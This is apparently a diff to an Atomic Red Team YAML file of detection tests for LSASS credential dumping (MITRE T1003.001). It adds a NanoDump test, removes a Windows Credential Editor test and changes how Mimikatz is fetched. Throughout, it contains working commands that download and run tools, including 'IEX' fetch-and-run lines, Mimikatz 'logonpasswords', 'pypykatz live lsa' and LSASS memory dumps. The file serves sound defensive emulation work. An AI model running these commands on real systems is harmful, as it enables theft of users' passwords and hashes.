@@ -1,57 +1,6 @@
 attack_technique: T1003.001
 display_name: "OS Credential Dumping: LSASS Memory"
 atomic_tests:
-- name: Windows Credential Editor
-  auto_generated_guid: 0f7c5301-6859-45ba-8b4d-1fac30fc31ed
-  description: |
-    Dump user credentials using Windows Credential Editor (supports Windows XP, 2003, Vista, 7, 2008 and Windows 8 only)
-
-    Upon successful execution, you should see a file with user passwords/hashes at %temp%/wce-output.file.
-
-    If you see no output it is likely that execution was blocked by Anti-Virus. 
-
-    If you see a message saying \"wce.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install Windows Credential Editor first.
-  supported_platforms:
-  - windows
-  input_arguments:
-    output_file:
-      description: Path where resulting data should be placed
-      type: Path
-      default: '%temp%\wce-output.txt'
-    wce_zip_hash:
-      description: File hash of the Windows Credential Editor zip file
-      type: String
-      default: 8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933
-    wce_exe:
-      description: Path of Windows Credential Editor executable
-      type: Path
-      default: PathToAtomicsFolder\T1003.001\bin\wce.exe
-    wce_url:
-      description: Path to download Windows Credential Editor zip file
-      type: url
-      default: https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
-  dependency_executor_name: powershell
-  dependencies:
-  - description: |
-      Windows Credential Editor must exist on disk at specified location (#{wce_exe})
-    prereq_command: |
-      if (Test-Path #{wce_exe}) {exit 0} else {exit 1}
-    get_prereq_command: |
-      $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
-      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
-      if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
-        Expand-Archive $zippath $parentpath\wce -Force
-        Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
-        Remove-Item $zippath, $parentpath\wce -Recurse
-      }
-  executor:
-    command: |
-      #{wce_exe} -o #{output_file}
-    cleanup_command: del "#{output_file}" >nul 2>&1
-    name: command_prompt
-    elevation_required: true
-  
 - name: Dump LSASS.exe Memory using ProcDump
   auto_generated_guid: 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8
   description: |
@@ -91,7 +40,6 @@ atomic_tests:
       del "#{output_file}" >nul 2> nul
     name: command_prompt
     elevation_required: true
-
 - name: Dump LSASS.exe Memory using comsvcs.dll
   auto_generated_guid: 2536dee2-12fb-459a-8c37-971844fa73be
   description: |
@@ -107,7 +55,6 @@ atomic_tests:
       Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
     name: powershell
     elevation_required: true
-
 - name: Dump LSASS.exe Memory using direct system calls and API unhooking
   auto_generated_guid: 7ae7102c-a099-45c8-b985-4c7a2d05790d
   description: |
@@ -141,6 +88,33 @@ atomic_tests:
       del C:\windows\temp\dumpert.dmp >nul 2> nul
     name: command_prompt
     elevation_required: true
+    
+- name: Dump LSASS.exe Memory using NanoDump
+  auto_generated_guid: dddd4aca-bbed-46f0-984d-e4c5971c51ea
+  description: |
+    The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.
+    
+    https://github.com/helpsystems/nanodump
+
+    Upon successful execution, you should find the nanondump.dmp file in the temp directory
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      NanoDump executable must exist on disk at specified location ($env:TEMP\nanodump.x64.exe)
+    prereq_command: |
+      if (Test-Path $env:TEMP\nanodump.x64.exe) {exit 0} else {exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      Invoke-WebRequest "https://github.com/helpsystems/nanodump/raw/84db0c1737bbe027431733c193cfacf59a07259b/compiled/nanodump.x64.exe" -OutFile "$env:TEMP\nanodump.x64.exe"
+  executor:
+    command: |
+      %temp%\nanodump.x64.exe -w "%temp%\nanodump.dmp"
+    cleanup_command: |
+      del "%temp%\nanodump.dmp" >nul 2> nul
+    name: command_prompt
+    elevation_required: true
 
 - name: Dump LSASS.exe Memory using Windows Task Manager
   auto_generated_guid: dea6c349-f1c6-44f3-87a1-1ed33a59a607
@@ -162,7 +136,6 @@ atomic_tests:
       3. Dump lsass.exe memory:
         Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
     name: manual
-
 - name: Offline Credential Theft With Mimikatz
   auto_generated_guid: 453acf13-1dbd-47d7-b28a-172ce9228023
   description: |
@@ -177,7 +150,7 @@ atomic_tests:
       default: '%tmp%\lsass.DMP'
     mimikatz_exe:
       description: Path of the Mimikatz binary
-      type: string
+      type: String
       default: PathToAtomicsFolder\T1003.001\bin\mimikatz.exe
   dependency_executor_name: powershell
   dependencies:
@@ -187,15 +160,8 @@ atomic_tests:
       if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
     get_prereq_command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      $url = 'https://github.com/gentilkiwi/mimikatz/releases/latest'
-      $request = [System.Net.WebRequest]::Create($url)
-      $response = $request.GetResponse()
-      $realTagUrl = $response.ResponseUri.OriginalString
-      $version = $realTagUrl.split('/')[-1]
-      $fileName = 'mimikatz_trunk.zip'
-      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      $realDownloadUrl =$realTagUrl.Replace('tag','download') + '/' + $fileName
-      Invoke-WebRequest $realDownloadUrl -OutFile "$env:TEMP\Mimi.zip"
+      $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+      Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\Mimi.zip"
       Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
       New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
       Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
@@ -210,7 +176,6 @@ atomic_tests:
       #{mimikatz_exe} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
     name: command_prompt
     elevation_required: true
-
 - name: LSASS read with pypykatz
   auto_generated_guid: c37bc535-5c62-4195-9cc3-0517673171d8
   description: |
@@ -249,7 +214,6 @@ atomic_tests:
       pypykatz live lsa
     name: command_prompt
     elevation_required: true
-
 - name: Dump LSASS.exe Memory using Out-Minidump.ps1
   auto_generated_guid: 6502c8f0-b775-4dbd-9193-1298f56b6781
   description: |
@@ -266,7 +230,6 @@ atomic_tests:
       Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
     name: powershell
     elevation_required: true
-
 - name: Create Mini Dump of LSASS.exe using ProcDump
   auto_generated_guid: 7cede33f-0acd-44ef-9774-15511300b24b
   description: |
@@ -305,7 +268,6 @@ atomic_tests:
       del "#{output_file}" >nul 2> nul
     name: command_prompt
     elevation_required: true
-
 - name: Powershell Mimikatz
   auto_generated_guid: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc
   description: |
@@ -325,7 +287,6 @@ atomic_tests:
       IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
     name: powershell
     elevation_required: true
-    
 - name: Dump LSASS with .Net 5 createdump.exe
   auto_generated_guid: 9d0072c8-7cca-45c4-bd14-f852cfa35cf0
   description: |
@@ -358,10 +319,9 @@ atomic_tests:
       $ID = $FIELDS[1]
       & "#{createdump_exe}" -u -f #{output_file} $ID
     cleanup_command: |
-      del #{output_file}
+      Remove-Item #{output_file} -ErrorAction Ignore
     name: powershell
     elevation_required: true  
-
 - name: Dump LSASS.exe using imported Microsoft DLLs
   auto_generated_guid: 86fc3f40-237f-4701-b155-81c01c48d697
   description: |
@@ -393,6 +353,6 @@ atomic_tests:
     command: |
       #{xordump_exe} -out #{output_file} -x 0x41
     cleanup_command: |
-      Remove-Item ${output_file} -ErrorAction Ignore
+      Remove-Item #{output_file} -ErrorAction Ignore
     name: powershell
     elevation_required: true
